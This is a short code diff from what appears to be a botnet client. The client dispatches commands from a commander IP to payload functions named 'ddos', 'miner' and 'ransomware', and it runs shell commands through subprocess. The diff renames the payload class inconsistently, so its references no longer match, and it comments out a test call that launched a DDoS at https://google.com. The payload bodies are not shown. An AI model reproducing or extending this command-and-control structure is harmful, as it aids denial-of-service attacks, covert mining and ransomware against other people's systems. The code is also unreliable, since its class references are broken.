@@ -43,7 +43,7 @@ class Shell:
 		output = subprocess.run(full_command, capture_output=True).stdout.split('\n')[0]
 		return output
 
-class Payloads:
+class Payload:
 	ammount = 0
 	def __init__(self):
 		if Payloads.ammount == 1:
@@ -94,7 +94,7 @@ class Client:
 		self.commander_ip = commander_ip
 		self.shell = shell 
 
-		self.payloads = Payloads()
+		self.payloads = Payloads.Payloads()
 		self.payloads_dict = {'ddos': self.payloads.ddos, 'miner': self.payloads.miner, 'ransomware': self.payloads.ransomware, \
 				   'idle': self.payloads.idle}
 
@@ -171,8 +171,8 @@ class Client:
 def main():
 	"""The main function"""
 	#connectionIsLive = True 
-	payload = Payloads()
-	payload.ddos(target='https://google.com')
+	#payload = Payloads.Payloads()
+	#payload.ddos(target='https://google.com')
 	#shell = Shell()
 	#while connectionIsLive:
 	#try:
